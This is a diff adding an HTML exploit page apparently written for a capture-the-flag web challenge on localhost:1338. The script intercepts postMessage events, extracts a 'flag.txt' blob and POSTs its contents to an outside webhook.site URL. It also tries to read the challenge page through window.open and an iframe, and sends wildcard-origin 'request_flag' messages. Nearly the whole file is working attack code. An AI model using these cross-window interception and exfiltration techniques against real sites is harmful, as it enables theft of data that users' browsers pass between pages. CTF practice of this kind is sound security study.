@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CTF Exploit</title>
+</head>
+<body>
+    <h1>CTF Exploit Page</h1>
+    <div id="status">Loading...</div>
+    <div id="output"></div>
+
+    <script>
+        const status = document.getElementById('status');
+        const output = document.getElementById('output');
+        
+        // Strategy 1: Listen for postMessage events
+        window.addEventListener('message', function(event) {
+            console.log('Received message:', event);
+            status.innerHTML = 'Received postMessage: ' + JSON.stringify(event.data);
+            
+            // Check if this is the flag sharing message
+            if (event.data && event.data.type === 'share' && event.data.files) {
+                event.data.files.forEach(file => {
+                    if (file.name === 'flag.txt') {
+                        // Try to read the blob
+                        if (file.blob) {
+                            file.blob.text().then(flag => {
+                                output.innerHTML = '<strong>FLAG FOUND:</strong> ' + flag;
+                                // Send flag to your server
+                                fetch('https://webhook.site/1b541b21-a716-4114-8883-dd4b1936f9df/flag', {
+                                    method: 'POST',
+                                    body: JSON.stringify({flag: flag}),
+                                    headers: {'Content-Type': 'application/json'}
+                                });
+                            });
+                        }
+                    }
+                });
+            }
+        });
+
+        // Strategy 2: Try to open the challenge page and access it
+        try {
+            const challengeWindow = window.open('http://localhost:1338', '_blank');
+            
+            setTimeout(() => {
+                try {
+                    // Try to access the challenge page content
+                    const challengeDoc = challengeWindow.document;
+                    status.innerHTML += '<br>Opened challenge window';
+                    
+                    // Look for any flag content in the DOM
+                    const bodyText = challengeDoc.body.innerText;
+                    if (bodyText.includes('CTF{') || bodyText.includes('flag')) {
+                        output.innerHTML = '<strong>Found in DOM:</strong> ' + bodyText;
+                    }
+                    
+                } catch (e) {
+                    status.innerHTML += '<br>Cannot access challenge window: ' + e.message;
+                }
+            }, 2000);
+            
+        } catch (e) {
+            status.innerHTML += '<br>Cannot open challenge window: ' + e.message;
+        }
+
+        // Strategy 3: Try iframe approach
+        const iframe = document.createElement('iframe');
+        iframe.src = 'http://localhost:1338';
+        iframe.style.width = '100%';
+        iframe.style.height = '400px';
+        document.body.appendChild(iframe);
+        
+        iframe.onload = function() {
+            status.innerHTML += '<br>Iframe loaded';
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const content = iframeDoc.body.innerText;
+                if (content.includes('CTF{')) {
+                    output.innerHTML = '<strong>Found in iframe:</strong> ' + content;
+                }
+            } catch (e) {
+                status.innerHTML += '<br>Cannot access iframe: ' + e.message;
+            }
+        };
+
+        // Strategy 4: Post a message to try to trigger the flag sharing again
+        setTimeout(() => {
+            // Try to trigger the flag sharing mechanism
+            window.postMessage({
+                type: "request_flag"
+            }, "*");
+            
+            // Also try to post to iframe
+            if (iframe.contentWindow) {
+                iframe.contentWindow.postMessage({
+                    type: "request_flag"
+                }, "*");
+            }
+        }, 3000);
+
+    </script>
+</body>
+</html>
